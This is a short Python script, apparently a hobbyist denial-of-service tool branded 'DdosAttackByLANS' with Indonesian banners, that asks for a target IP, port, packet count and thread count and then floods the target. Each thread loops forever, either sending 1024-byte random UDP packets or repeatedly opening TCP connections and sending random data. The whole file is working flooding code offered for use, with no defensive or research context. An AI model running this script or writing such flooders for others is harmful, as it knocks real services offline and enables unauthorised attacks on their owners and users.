import random
import socket
import threading
import os

os.system("clear")
print("Attacked by lans")
print("gunain dengan bijak")
print("welcome back, im here")
ip = str(input(" DdosAttackByLANS | Ip:"))
port = int(input(" DdosAttackByLANS | Port:"))
choice = str(input(" DdosAttackByLANS | yakin ????(y/n):"))
times = int(input(" DdosAttackByLANS | Packets:"))
threads = int(input(" DdosAttackByLANS | Threads:"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" | LANS IN HERE |")
		except:
			print("[!] | yahahaha |")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" tok tok misii !!")
		except:
			s.close()
			print("[*] MISII PAKETTT")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
